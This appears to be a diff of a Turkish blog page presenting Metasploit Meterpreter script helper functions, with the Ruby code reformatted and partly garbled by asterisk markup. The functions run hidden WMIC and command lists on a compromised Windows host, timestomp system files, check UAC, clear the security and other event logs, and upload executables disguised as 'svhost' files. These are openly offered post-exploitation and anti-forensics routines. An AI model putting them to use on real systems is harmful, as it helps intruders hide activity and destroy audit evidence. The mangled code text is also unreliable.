Zamanlarını Değiştirme def chmace***(*** session,cmds***)*** windir ***=*** &#39;&#39; windrtmp ***=*** &#34;&#34; print_status***(*** &#34;Changing Access Time, Modified Time and Created Time of Files Used&#34;***)*** windir ***=*** session.fs.file.expand_path***(*** &#34;%WinDir%&#34;***)*** cmds.each ***do*** |c| begin session.core.use***(*** &#34;priv&#34;***)*** filetostomp ***=*** windir &#43; &#34;system32&#34;&#43; c fl2clone ***=*** windir &#43; &#34;system32chkdsk.exe&#34; print_status***(*** &#34;tChanging file MACE attributes on #{filetostomp}&#34;***)*** session.priv.fs.set_file_mace_from_file***(*** filetostomp, fl2clone***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error changing MACE: #{e.class} #{e}&#34;***)*** end end end UAC Kontrolü def checkuac***(*** session***)*** uac ***=*** false begin winversion ***=*** session.sys.config.sysinfo ***if *** winversion[&#39;OS&#39;***]=*** ~ /Windows Vista/ or winversion[&#39;OS&#39;***]=*** ~ /Windows 7/ print_status***(*** &#34;Checking if UAC is enaled ...&#34;***)*** key ***=*** &#39;HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem&#39; root_key, base_key ***=*** session.sys.registry.splitkey***(*** key***)*** value ***=*** &#34;EnableLUA&#34; open_key ***=*** session.sys.registry.open_key***(*** root_key, base_key, KEY_READ***)*** v ***=*** open_key.query_value***(*** value***)*** ***if *** v.data ***==*** 1 uac ***=*** true ***else *** uac ***=*** false end open_key.close_key***(*** key***)*** end rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error Checking UAC: #{e.class} #{e}&#34;***)*** end ***return *** uac end Tüm Olay Loglarını Temizleme def clrevtlgs***(*** session***)*** evtlogs ***=*** ***[*** &#39;security&#39;, &#39;system&#39;, &#39;application&#39;, &#39;directory service&#39;, &#39;dns server&#39;, &#39;file replication service&#39; ***]*** print_status***(*** &#34;Clearing Event Logs, this will leave and event 517&#34;***)*** begin evtlogs.each ***do*** |evl| print_status***(*** &#34;tClearing the #{evl} Event Log&#34;***)*** log ***=*** session.sys.eventlog.open***(*** evl***)*** log.clear end print_status***(*** &#34;Alll Event Logs have been cleared&#34;***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error clearing Event Log: #{e.class} #{e}&#34;***)*** end end Bir Komut Listesini Çalıştırma def list_exec***(*** session,cmdlst***)*** ***if *** cmdlst.kind_of? String cmdlst ***=*** cmdlst.to_a end print_status***(*** &#34;Running Command List ...&#34;***)*** r***=*** &#39;&#39; session.response_timeout***=*** 120 cmdlst.each ***do*** |cmd| begin print_status &#34;trunning command #{cmd}&#34; r ***=*** session.sys.process.execute***(*** cmd, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true, &#39;Channelized&#39; ***=&gt;*** true***})*** ***while*** ***(*** d ***=*** r.channel.read***)*** print_status***(*** &#34;t#{d}&#34;***)*** end r.channel.close r.close rescue ::Exception ***=&gt;*** e print_error***(*** &#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;***)*** end end end Dosyaları Karşı Tarafa Yükleme def upload***(*** session,file,trgloc ***=*** nil***)*** ***if *** not ::File.exists?***(*** file***)*** raise &#34;File to Upload does not exists!&#34; ***else if *** trgloc ***==*** nil location ***=*** session.fs.file.expand_path***(*** &#34;%TEMP%&#34;***)*** ***else *** location ***=*** trgloc end begin ***if *** file ***=*** ~ /S******* ***(*** .exe***)*** /i fileontrgt ***=*** &#34;#{location}svhost#{rand(100)}.exe&#34; ***else *** fileontrgt ***=*** &#34;#{location}TMP#{rand(100)}&#34; end print_status***(*** &#34;Uploadingd #{file}....&#34;***)*** session.fs.file.upload_file***(*** &#34;#{fileontrgt}&#34;,&#34;#{file}&#34;***)*** print_status***(*** &#34;#{file} uploaded!&#34;***)*** print_status***(*** &#34;#{fileontrgt}&#34;***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error uploading file #{file}: #{e.class} #{e}&#34;***)*** end end ***return *** fileontrgt end Bir Dosyaya Veri Yazma def filewrt***(*** file2wrt, data2wrt***)*** output ***=*** ::File.open***(*** file2wrt, &#34;a&#34;***)*** data2wrt.each_line ***do*** |d| output.puts***(*** d***)*** end output.close end">
   <meta itemprop="datePublished" content="2017-06-14T13:51:00+00:00">
   <meta itemprop="dateModified" content="2017-06-14T13:51:00+00:00">
-  <meta itemprop="wordCount" content="504">
+  <meta itemprop="wordCount" content="581">
   <meta itemprop="keywords" content="Cybersecurity,Metasploit Framework">
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="MSF Meterpreter Script Fonksiyonlar">
   <meta name="twitter:description" content="Kullanışlı Fonksiyonlar Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz. Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz.
-Kullanılabilir WMIC Komutları def wmicexec(session,wmiccmds= nil) windr = &#39;&#39; tmpout = &#39;&#39; windrtmp = &#34;&#34; session.response_timeout=120 begin tmp = session.fs.file.expand_path(&#34;%TEMP%&#34;) wmicfl = tmp &#43; &#34;&#34;&#43; sprintf(&#34;%.5d&#34;,rand(100000)) wmiccmds.each do |wmi| print_status &#34;running command wmic #{wmi}&#34; cmd = &#34;cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe&#34; opt = &#34;/append:#{wmicfl} #{wmi}&#34; r = session.sys.process.execute( cmd, opt,{&#39;Hidden&#39; =&gt; true}) sleep(2) #Making sure that wmic finnishes before executing next wmic command prog2check = &#34;wmic.exe&#34; found = 0 while found == 0 session.sys.process.get_processes().each do |x| found =1 if prog2check == (x[&#39;name&#39;].downcase) sleep(0.5) print_line &#34;.&#34; found = 0 end end end r.close end # Read the output file of the wmic commands wmioutfile = session.fs.file.new(wmicfl, &#34;rb&#34;) until wmioutfile.eof? tmpout &gt;&gt; wmioutfile.read end wmioutfile.close rescue ::Exception =&gt; e print_status(&#34;Error running WMIC commands: #{e.class} #{e}&#34;) end # We delete the file with the wmic command output. c = session.sys.process.execute(&#34;cmd.exe /c del #{wmicfl}&#34;, nil, {&#39;Hidden&#39; =&gt; true}) c.close tmpout end Dosyaların MAC Zamanlarını Değiştirme def chmace(session,cmds) windir = &#39;&#39; windrtmp = &#34;&#34; print_status(&#34;Changing Access Time, Modified Time and Created Time of Files Used&#34;) windir = session.fs.file.expand_path(&#34;%WinDir%&#34;) cmds.each do |c| begin session.core.use(&#34;priv&#34;) filetostomp = windir &#43; &#34;system32&#34;&#43; c fl2clone = windir &#43; &#34;system32chkdsk.exe&#34; print_status(&#34;tChanging file MACE attributes on #{filetostomp}&#34;) session.priv.fs.set_file_mace_from_file(filetostomp, fl2clone) rescue ::Exception =&gt; e print_status(&#34;Error changing MACE: #{e.class} #{e}&#34;) end end end UAC Kontrolü def checkuac(session) uac = false begin winversion = session.sys.config.sysinfo if winversion[&#39;OS&#39;]=~ /Windows Vista/ or winversion[&#39;OS&#39;]=~ /Windows 7/ print_status(&#34;Checking if UAC is enaled ...&#34;) key = &#39;HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem&#39; root_key, base_key = session.sys.registry.splitkey(key) value = &#34;EnableLUA&#34; open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ) v = open_key.query_value(value) if v.data == 1 uac = true else uac = false end open_key.close_key(key) end rescue ::Exception =&gt; e print_status(&#34;Error Checking UAC: #{e.class} #{e}&#34;) end return uac end Tüm Olay Loglarını Temizleme def clrevtlgs(session) evtlogs = [ &#39;security&#39;, &#39;system&#39;, &#39;application&#39;, &#39;directory service&#39;, &#39;dns server&#39;, &#39;file replication service&#39; ] print_status(&#34;Clearing Event Logs, this will leave and event 517&#34;) begin evtlogs.each do |evl| print_status(&#34;tClearing the #{evl} Event Log&#34;) log = session.sys.eventlog.open(evl) log.clear end print_status(&#34;Alll Event Logs have been cleared&#34;) rescue ::Exception =&gt; e print_status(&#34;Error clearing Event Log: #{e.class} #{e}&#34;) end end Bir Komut Listesini Çalıştırma def list_exec(session,cmdlst) if cmdlst.kind_of? String cmdlst = cmdlst.to_a end print_status(&#34;Running Command List ...&#34;) r=&#39;&#39; session.response_timeout=120 cmdlst.each do |cmd| begin print_status &#34;trunning command #{cmd}&#34; r = session.sys.process.execute(cmd, nil, {&#39;Hidden&#39; =&gt; true, &#39;Channelized&#39; =&gt; true}) while(d = r.channel.read) print_status(&#34;t#{d}&#34;) end r.channel.close r.close rescue ::Exception =&gt; e print_error(&#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;) end end end Dosyaları Karşı Tarafa Yükleme def upload(session,file,trgloc = nil) if not ::File.exists?(file) raise &#34;File to Upload does not exists!&#34; else if trgloc == nil location = session.fs.file.expand_path(&#34;%TEMP%&#34;) else location = trgloc end begin if file =~ /S*(.exe)/i fileontrgt = &#34;#{location}svhost#{rand(100)}.exe&#34; else fileontrgt = &#34;#{location}TMP#{rand(100)}&#34; end print_status(&#34;Uploadingd #{file}....&#34;) session.fs.file.upload_file(&#34;#{fileontrgt}&#34;,&#34;#{file}&#34;) print_status(&#34;#{file} uploaded!&#34;) print_status(&#34;#{fileontrgt}&#34;) rescue ::Exception =&gt; e print_status(&#34;Error uploading file #{file}: #{e.class} #{e}&#34;) end end return fileontrgt end Bir Dosyaya Veri Yazma def filewrt(file2wrt, data2wrt) output = ::File.open(file2wrt, &#34;a&#34;) data2wrt.each_line do |d| output.puts(d) end output.close end">
+Kullanılabilir WMIC Komutları def wmicexec***(*** session,wmiccmds***=*** nil***)*** windr ***=*** &#39;&#39; tmpout ***=*** &#39;&#39; windrtmp ***=*** &#34;&#34; session.response_timeout***=*** 120 begin tmp ***=*** session.fs.file.expand_path***(*** &#34;%TEMP%&#34;***)*** wmicfl ***=*** tmp &#43; &#34;&#34;&#43; sprintf***(*** &#34;%.5d&#34;,rand***(*** 100000***))*** wmiccmds.each ***do*** |wmi| print_status &#34;running command wmic #{wmi}&#34; cmd ***=*** &#34;cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe&#34; opt ***=*** &#34;/append:#{wmicfl} #{wmi}&#34; r ***=*** session.sys.process.execute***(*** cmd, opt,***{*** &#39;Hidden&#39; ***=&gt;*** true***})*** sleep***(*** 2***)*** #Making sure that wmic finnishes before executing next wmic command prog2check ***=*** &#34;wmic.exe&#34; found ***=*** 0 ***while *** found ***==*** 0 session.sys.process.get_processes***()*** .each ***do*** |x| found ***=*** 1 ***if *** prog2check ***==*** ***(*** x[&#39;name&#39;***]*** .downcase***)*** sleep***(*** 0.5***)*** print_line &#34;.&#34; found ***=*** 0 end end end r.close end # Read the output file of the wmic commands wmioutfile ***=*** session.fs.file.new***(*** wmicfl, &#34;rb&#34;***)*** ***until *** wmioutfile.eof? tmpout ***&gt;&gt;*** wmioutfile.read end wmioutfile.close rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error running WMIC commands: #{e.class} #{e}&#34;***)*** end # We delete the file with the wmic command output. c ***=*** session.sys.process.execute***(*** &#34;cmd.exe /c del #{wmicfl}&#34;, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true***})*** c.close tmpout end Dosyaların MAC Zamanlarını Değiştirme def chmace***(*** session,cmds***)*** windir ***=*** &#39;&#39; windrtmp ***=*** &#34;&#34; print_status***(*** &#34;Changing Access Time, Modified Time and Created Time of Files Used&#34;***)*** windir ***=*** session.fs.file.expand_path***(*** &#34;%WinDir%&#34;***)*** cmds.each ***do*** |c| begin session.core.use***(*** &#34;priv&#34;***)*** filetostomp ***=*** windir &#43; &#34;system32&#34;&#43; c fl2clone ***=*** windir &#43; &#34;system32chkdsk.exe&#34; print_status***(*** &#34;tChanging file MACE attributes on #{filetostomp}&#34;***)*** session.priv.fs.set_file_mace_from_file***(*** filetostomp, fl2clone***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error changing MACE: #{e.class} #{e}&#34;***)*** end end end UAC Kontrolü def checkuac***(*** session***)*** uac ***=*** false begin winversion ***=*** session.sys.config.sysinfo ***if *** winversion[&#39;OS&#39;***]=*** ~ /Windows Vista/ or winversion[&#39;OS&#39;***]=*** ~ /Windows 7/ print_status***(*** &#34;Checking if UAC is enaled ...&#34;***)*** key ***=*** &#39;HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem&#39; root_key, base_key ***=*** session.sys.registry.splitkey***(*** key***)*** value ***=*** &#34;EnableLUA&#34; open_key ***=*** session.sys.registry.open_key***(*** root_key, base_key, KEY_READ***)*** v ***=*** open_key.query_value***(*** value***)*** ***if *** v.data ***==*** 1 uac ***=*** true ***else *** uac ***=*** false end open_key.close_key***(*** key***)*** end rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error Checking UAC: #{e.class} #{e}&#34;***)*** end ***return *** uac end Tüm Olay Loglarını Temizleme def clrevtlgs***(*** session***)*** evtlogs ***=*** ***[*** &#39;security&#39;, &#39;system&#39;, &#39;application&#39;, &#39;directory service&#39;, &#39;dns server&#39;, &#39;file replication service&#39; ***]*** print_status***(*** &#34;Clearing Event Logs, this will leave and event 517&#34;***)*** begin evtlogs.each ***do*** |evl| print_status***(*** &#34;tClearing the #{evl} Event Log&#34;***)*** log ***=*** session.sys.eventlog.open***(*** evl***)*** log.clear end print_status***(*** &#34;Alll Event Logs have been cleared&#34;***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error clearing Event Log: #{e.class} #{e}&#34;***)*** end end Bir Komut Listesini Çalıştırma def list_exec***(*** session,cmdlst***)*** ***if *** cmdlst.kind_of? String cmdlst ***=*** cmdlst.to_a end print_status***(*** &#34;Running Command List ...&#34;***)*** r***=*** &#39;&#39; session.response_timeout***=*** 120 cmdlst.each ***do*** |cmd| begin print_status &#34;trunning command #{cmd}&#34; r ***=*** session.sys.process.execute***(*** cmd, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true, &#39;Channelized&#39; ***=&gt;*** true***})*** ***while*** ***(*** d ***=*** r.channel.read***)*** print_status***(*** &#34;t#{d}&#34;***)*** end r.channel.close r.close rescue ::Exception ***=&gt;*** e print_error***(*** &#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;***)*** end end end Dosyaları Karşı Tarafa Yükleme def upload***(*** session,file,trgloc ***=*** nil***)*** ***if *** not ::File.exists?***(*** file***)*** raise &#34;File to Upload does not exists!&#34; ***else if *** trgloc ***==*** nil location ***=*** session.fs.file.expand_path***(*** &#34;%TEMP%&#34;***)*** ***else *** location ***=*** trgloc end begin ***if *** file ***=*** ~ /S******* ***(*** .exe***)*** /i fileontrgt ***=*** &#34;#{location}svhost#{rand(100)}.exe&#34; ***else *** fileontrgt ***=*** &#34;#{location}TMP#{rand(100)}&#34; end print_status***(*** &#34;Uploadingd #{file}....&#34;***)*** session.fs.file.upload_file***(*** &#34;#{fileontrgt}&#34;,&#34;#{file}&#34;***)*** print_status***(*** &#34;#{file} uploaded!&#34;***)*** print_status***(*** &#34;#{fileontrgt}&#34;***)*** rescue ::Exception ***=&gt;*** e print_status***(*** &#34;Error uploading file #{file}: #{e.class} #{e}&#34;***)*** end end ***return *** fileontrgt end Bir Dosyaya Veri Yazma def filewrt***(*** file2wrt, data2wrt***)*** output ***=*** ::File.open***(*** file2wrt, &#34;a&#34;***)*** data2wrt.each_line ***do*** |d| output.puts***(*** d***)*** end output.close end">
 
     <link href="/css/compiled/main.css" rel="stylesheet" />
 
@@ -9888,46 +9888,46 @@ Kullanılabilir WMIC Komutları def wmicexec(session,wmiccmds= nil) windr = &#39
 <h1 class="wp-block-heading" id="kullanılabilir-wmic-komutları">Kullanılabilir WMIC Komutları 
 <!-- /wp:heading -->
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">def wmicexec<strong>(</strong>session,wmiccmds<strong>=</strong> nil<strong>)</strong>
-        windr <strong>=</strong> ''
-        tmpout <strong>=</strong> ''
-        windrtmp <strong>=</strong> ""
-        session.response_timeout<strong>=</strong>120
+<pre class="wp-block-code"><code lang="bash" class="language-bash">def wmicexec***(*** session,wmiccmds***=***  nil***)*** 
+        windr ***=***  ''
+        tmpout ***=***  ''
+        windrtmp ***=***  ""
+        session.response_timeout***=*** 120
         begin
-                tmp <strong>=</strong> session.fs.file.expand_path<strong>(</strong>"%TEMP%"<strong>)</strong>
-                wmicfl <strong>=</strong> tmp + ""+ sprintf<strong>(</strong>"%.5d",rand<strong>(</strong>100000<strong>))</strong>
-                wmiccmds.each <strong>do</strong> |wmi|
+                tmp ***=***  session.fs.file.expand_path***(*** "%TEMP%"***)*** 
+                wmicfl ***=***  tmp + ""+ sprintf***(*** "%.5d",rand***(*** 100000***))*** 
+                wmiccmds.each ***do***  |wmi|
                         print_status "running command wmic #{wmi}"
-                        cmd <strong>=</strong> "cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe"
-                        opt <strong>=</strong> "/append:#{wmicfl} #{wmi}"
-                        r <strong>=</strong> session.sys.process.execute<strong>(</strong> cmd, opt,<strong>{</strong>'Hidden' <strong>=&gt;</strong> true<strong>})</strong>
-                        sleep<strong>(</strong>2<strong>)</strong>
+                        cmd ***=***  "cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe"
+                        opt ***=***  "/append:#{wmicfl} #{wmi}"
+                        r ***=***  session.sys.process.execute***(***  cmd, opt,***{*** 'Hidden' ***=&gt;***  true***})*** 
+                        sleep***(*** 2***)*** 
                         <em>#Making sure that wmic finnishes before executing next wmic command</em>
-                        prog2check <strong>=</strong> "wmic.exe"
-                        found <strong>=</strong> 0
-                        <strong>while </strong>found <strong>==</strong> 0
-                                session.sys.process.get_processes<strong>()</strong>.each <strong>do</strong> |x|
-                                        found <strong>=</strong>1
-                                        <strong>if </strong>prog2check <strong>==</strong> <strong>(</strong>x['name'<strong>]</strong>.downcase<strong>)</strong>
-                                                sleep<strong>(</strong>0.5<strong>)</strong>
+                        prog2check ***=***  "wmic.exe"
+                        found ***=***  0
+                        ***while *** found ***==***  0
+                                session.sys.process.get_processes***()*** .each ***do***  |x|
+                                        found ***=*** 1
+                                        ***if *** prog2check ***==***  ***(*** x['name'***]*** .downcase***)*** 
+                                                sleep***(*** 0.5***)*** 
                                                             print_line "."
-                                                found <strong>=</strong> 0
+                                                found ***=***  0
                                         end
                                 end
                         end
                         r.close
                 end
                 <em># Read the output file of the wmic commands</em>
-                wmioutfile <strong>=</strong> session.fs.file.new<strong>(</strong>wmicfl, "rb"<strong>)</strong>
-                <strong>until </strong>wmioutfile.eof?
-                        tmpout <strong>&gt;&gt;</strong> wmioutfile.read
+                wmioutfile ***=***  session.fs.file.new***(*** wmicfl, "rb"***)*** 
+                ***until *** wmioutfile.eof?
+                        tmpout ***&gt;&gt;***  wmioutfile.read
                 end
                 wmioutfile.close
-        rescue ::Exception <strong>=&gt;</strong> e
-                print_status<strong>(</strong>"Error running WMIC commands: #{e.class} #{e}"<strong>)</strong>
+        rescue ::Exception ***=&gt;***  e
+                print_status***(*** "Error running WMIC commands: #{e.class} #{e}"***)*** 
         end
         <em># We delete the file with the wmic command output.</em>
-        c <strong>=</strong> session.sys.process.execute<strong>(</strong>"cmd.exe /c del #{wmicfl}", nil, <strong>{</strong>'Hidden' <strong>=&gt;</strong> true<strong>})</strong>
+        c ***=***  session.sys.process.execute***(*** "cmd.exe /c del #{wmicfl}", nil, ***{*** 'Hidden' ***=&gt;***  true***})*** 
         c.close
         tmpout
 end
@@ -9937,21 +9937,21 @@ end
 <h1 class="wp-block-heading" id="dosyaların-mac-zamanlarını-değiştirme">Dosyaların MAC Zamanlarını Değiştirme 
 <!-- /wp:heading -->
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">def chmace<strong>(</strong>session,cmds<strong>)</strong>
-    windir <strong>=</strong> ''
-    windrtmp <strong>=</strong> ""
-    print_status<strong>(</strong>"Changing Access Time, Modified Time and Created Time of Files Used"<strong>)</strong>
-    windir <strong>=</strong> session.fs.file.expand_path<strong>(</strong>"%WinDir%"<strong>)</strong>
-    cmds.each <strong>do</strong> |c|
+<pre class="wp-block-code"><code lang="bash" class="language-bash">def chmace***(*** session,cmds***)*** 
+    windir ***=***  ''
+    windrtmp ***=***  ""
+    print_status***(*** "Changing Access Time, Modified Time and Created Time of Files Used"***)*** 
+    windir ***=***  session.fs.file.expand_path***(*** "%WinDir%"***)*** 
+    cmds.each ***do***  |c|
         begin
-            session.core.use<strong>(</strong>"priv"<strong>)</strong>
-            filetostomp <strong>=</strong> windir + "system32"+ c
-            fl2clone <strong>=</strong> windir + "system32chkdsk.exe"
-            print_status<strong>(</strong>"tChanging file MACE attributes on #{filetostomp}"<strong>)</strong>
-            session.priv.fs.set_file_mace_from_file<strong>(</strong>filetostomp, fl2clone<strong>)</strong>
+            session.core.use***(*** "priv"***)*** 
+            filetostomp ***=***  windir + "system32"+ c
+            fl2clone ***=***  windir + "system32chkdsk.exe"
+            print_status***(*** "tChanging file MACE attributes on #{filetostomp}"***)*** 
+            session.priv.fs.set_file_mace_from_file***(*** filetostomp, fl2clone***)*** 
 
-        rescue ::Exception <strong>=&gt;</strong> e
-            print_status<strong>(</strong>"Error changing MACE: #{e.class} #{e}"<strong>)</strong>
+        rescue ::Exception ***=&gt;***  e
+            print_status***(*** "Error changing MACE: #{e.class} #{e}"***)*** 
         end
     end
 end
@@ -9961,28 +9961,28 @@ end
 <h1 class="wp-block-heading" id="uac-kontrolü">UAC Kontrolü 
 <!-- /wp:heading -->
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">def checkuac<strong>(</strong>session<strong>)</strong>
-    uac <strong>=</strong> false
+<pre class="wp-block-code"><code lang="bash" class="language-bash">def checkuac***(*** session***)*** 
+    uac ***=***  false
     begin
-        winversion <strong>=</strong> session.sys.config.sysinfo
-        <strong>if </strong>winversion['OS'<strong>]=</strong>~ /Windows Vista/ or  winversion['OS'<strong>]=</strong>~ /Windows 7/
-            print_status<strong>(</strong>"Checking if UAC is enaled ..."<strong>)</strong>
-            key <strong>=</strong> 'HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem'
-            root_key, base_key <strong>=</strong> session.sys.registry.splitkey<strong>(</strong>key<strong>)</strong>
-            value <strong>=</strong> "EnableLUA"
-            open_key <strong>=</strong> session.sys.registry.open_key<strong>(</strong>root_key, base_key, KEY_READ<strong>)</strong>
-            v <strong>=</strong> open_key.query_value<strong>(</strong>value<strong>)</strong>
-            <strong>if </strong>v.data <strong>==</strong> 1
-                uac <strong>=</strong> true
-            <strong>else
-                </strong>uac <strong>=</strong> false
+        winversion ***=***  session.sys.config.sysinfo
+        ***if *** winversion['OS'***]=*** ~ /Windows Vista/ or  winversion['OS'***]=*** ~ /Windows 7/
+            print_status***(*** "Checking if UAC is enaled ..."***)*** 
+            key ***=***  'HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem'
+            root_key, base_key ***=***  session.sys.registry.splitkey***(*** key***)*** 
+            value ***=***  "EnableLUA"
+            open_key ***=***  session.sys.registry.open_key***(*** root_key, base_key, KEY_READ***)*** 
+            v ***=***  open_key.query_value***(*** value***)*** 
+            ***if *** v.data ***==***  1
+                uac ***=***  true
+            ***else
+                *** uac ***=***  false
             end
-            open_key.close_key<strong>(</strong>key<strong>)</strong>
+            open_key.close_key***(*** key***)*** 
         end
-    rescue ::Exception <strong>=&gt;</strong> e
-        print_status<strong>(</strong>"Error Checking UAC: #{e.class} #{e}"<strong>)</strong>
+    rescue ::Exception ***=&gt;***  e
+        print_status***(*** "Error Checking UAC: #{e.class} #{e}"***)*** 
     end
-    <strong>return </strong>uac
+    ***return *** uac
 end
 </code></pre>
 <!-- /wp:code -->
@@ -9990,25 +9990,25 @@ end
 <h1 class="wp-block-heading" id="tüm-olay-loglarını-temizleme">Tüm Olay Loglarını Temizleme 
 <!-- /wp:heading -->
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">def clrevtlgs<strong>(</strong>session<strong>)</strong>
-    evtlogs <strong>=</strong> <strong>[</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">def clrevtlgs***(*** session***)*** 
+    evtlogs ***=***  ***[*** 
         'security',
         'system',
         'application',
         'directory service',
         'dns server',
         'file replication service'
-    <strong>]</strong>
-    print_status<strong>(</strong>"Clearing Event Logs, this will leave and event 517"<strong>)</strong>
+    ***]*** 
+    print_status***(*** "Clearing Event Logs, this will leave and event 517"***)*** 
     begin
-        evtlogs.each <strong>do</strong> |evl|
-            print_status<strong>(</strong>"tClearing the #{evl} Event Log"<strong>)</strong>
-            log <strong>=</strong> session.sys.eventlog.open<strong>(</strong>evl<strong>)</strong>
+        evtlogs.each ***do***  |evl|
+            print_status***(*** "tClearing the #{evl} Event Log"***)*** 
+            log ***=***  session.sys.eventlog.open***(*** evl***)*** 
             log.clear
         end
-        print_status<strong>(</strong>"Alll Event Logs have been cleared"<strong>)</strong>
-    rescue ::Exception <strong>=&gt;</strong> e
-        print_status<strong>(</strong>"Error clearing Event Log: #{e.class} #{e}"<strong>)</strong>
+        print_status***(*** "Alll Event Logs have been cleared"***)*** 
+    rescue ::Exception ***=&gt;***  e
+        print_status***(*** "Error clearing Event Log: #{e.class} #{e}"***)*** 
 
     end
 end
@@ -10018,25 +10018,25 @@ end
 <h1 class="wp-block-heading" id="bir-komut-listesini-çalıştırma">Bir Komut Listesini Çalıştırma 
 <!-- /wp:heading -->
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">def list_exec<strong>(</strong>session,cmdlst<strong>)</strong>
-    <strong>if </strong>cmdlst.kind_of? String
-        cmdlst <strong>=</strong> cmdlst.to_a
+<pre class="wp-block-code"><code lang="bash" class="language-bash">def list_exec***(*** session,cmdlst***)*** 
+    ***if *** cmdlst.kind_of? String
+        cmdlst ***=***  cmdlst.to_a
     end
-    print_status<strong>(</strong>"Running Command List ..."<strong>)</strong>
-    r<strong>=</strong>''
-    session.response_timeout<strong>=</strong>120
-    cmdlst.each <strong>do</strong> |cmd|
+    print_status***(*** "Running Command List ..."***)*** 
+    r***=*** ''
+    session.response_timeout***=*** 120
+    cmdlst.each ***do***  |cmd|
         begin
             print_status "trunning command #{cmd}"
-            r <strong>=</strong> session.sys.process.execute<strong>(</strong>cmd, nil, <strong>{</strong>'Hidden' <strong>=&gt;</strong> true, 'Channelized' <strong>=&gt;</strong> true<strong>})</strong>
-            <strong>while</strong><strong>(</strong>d <strong>=</strong> r.channel.read<strong>)</strong>
+            r ***=***  session.sys.process.execute***(*** cmd, nil, ***{*** 'Hidden' ***=&gt;***  true, 'Channelized' ***=&gt;***  true***})*** 
+            ***while*** ***(*** d ***=***  r.channel.read***)*** 
 
-                print_status<strong>(</strong>"t#{d}"<strong>)</strong>
+                print_status***(*** "t#{d}"***)*** 
             end
             r.channel.close
             r.close
-        rescue ::Exception <strong>=&gt;</strong> e
-            print_error<strong>(</strong>"Error Running Command #{cmd}: #{e.class} #{e}"<strong>)</strong>
+        rescue ::Exception ***=&gt;***  e
+            print_error***(*** "Error Running Command #{cmd}: #{e.class} #{e}"***)*** 
         end
     end
 end
@@ -10046,30 +10046,30 @@ end
 <h1 class="wp-block-heading" id="dosyaları-karşı-tarafa-yükleme">Dosyaları Karşı Tarafa Yükleme 
 <!-- /wp:heading -->
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">def upload<strong>(</strong>session,file,trgloc <strong>=</strong> nil<strong>)</strong>
-    <strong>if </strong>not ::File.exists?<strong>(</strong>file<strong>)</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">def upload***(*** session,file,trgloc ***=***  nil***)*** 
+    ***if *** not ::File.exists?***(*** file***)*** 
             raise "File to Upload does not exists!"
-        <strong>else
-        if </strong>trgloc <strong>==</strong> nil
-        location <strong>=</strong> session.fs.file.expand_path<strong>(</strong>"%TEMP%"<strong>)</strong>
-        <strong>else
-            </strong>location <strong>=</strong> trgloc
+        ***else
+        if *** trgloc ***==***  nil
+        location ***=***  session.fs.file.expand_path***(*** "%TEMP%"***)*** 
+        ***else
+            *** location ***=***  trgloc
         end
         begin
-            <strong>if </strong>file <strong>=</strong>~ /S<strong>*</strong><strong>(</strong>.exe<strong>)</strong>/i
-                       fileontrgt <strong>=</strong> "#{location}svhost#{rand(100)}.exe"
-            <strong>else
-                    </strong>fileontrgt <strong>=</strong> "#{location}TMP#{rand(100)}"
+            ***if *** file ***=*** ~ /S******* ***(*** .exe***)*** /i
+                       fileontrgt ***=***  "#{location}svhost#{rand(100)}.exe"
+            ***else
+                    *** fileontrgt ***=***  "#{location}TMP#{rand(100)}"
             end
-            print_status<strong>(</strong>"Uploadingd #{file}...."<strong>)</strong>
-            session.fs.file.upload_file<strong>(</strong>"#{fileontrgt}","#{file}"<strong>)</strong>
-            print_status<strong>(</strong>"#{file} uploaded!"<strong>)</strong>
-            print_status<strong>(</strong>"#{fileontrgt}"<strong>)</strong>
-        rescue ::Exception <strong>=&gt;</strong> e
-            print_status<strong>(</strong>"Error uploading file #{file}: #{e.class} #{e}"<strong>)</strong>
+            print_status***(*** "Uploadingd #{file}...."***)*** 
+            session.fs.file.upload_file***(*** "#{fileontrgt}","#{file}"***)*** 
+            print_status***(*** "#{file} uploaded!"***)*** 
+            print_status***(*** "#{fileontrgt}"***)*** 
+        rescue ::Exception ***=&gt;***  e
+            print_status***(*** "Error uploading file #{file}: #{e.class} #{e}"***)*** 
         end
     end
-    <strong>return </strong>fileontrgt
+    ***return *** fileontrgt
 end
 </code></pre>
 <!-- /wp:code -->
@@ -10077,10 +10077,10 @@ end
